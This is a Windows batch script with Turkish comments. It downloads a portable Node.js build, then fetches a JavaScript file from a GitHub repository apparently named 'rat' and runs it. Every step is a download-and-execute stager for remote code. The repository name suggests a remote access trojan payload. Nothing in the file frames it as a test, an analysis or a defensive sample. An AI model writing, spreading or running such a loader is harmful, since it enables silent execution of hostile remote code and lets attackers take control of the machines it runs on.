@echo off
setlocal

:: Node.js indirme URL'i
set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"

:: Script dosyasının indirme URL'i
set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/x.js"

:: İndirilecek dosyaların hedef konumu
set "downloadPath=%~dp0"

:: Node.js indirme
echo Node.js indiriliyor...
powershell -command "Invoke-WebRequest -Uri '%nodeUrl%' -OutFile '%downloadPath%\node.zip'"

:: Zip dosyasının çıkarılması
echo Zip dosyası çıkarılıyor...
powershell -command "Expand-Archive -Path '%downloadPath%\node.zip' -DestinationPath '%downloadPath%'"

:: Script dosyasının indirilmesi
echo Script dosyası indiriliyor...
powershell -command "Invoke-WebRequest -Uri '%scriptUrl%' -OutFile '%downloadPath%\your-script.js'"

:: Node.js'in çalıştırılması
echo Node.js çalıştırılıyor...
"%downloadPath%\node-v16.3.0-win-x64\node.exe" "%downloadPath%\your-script.js"

endlocal
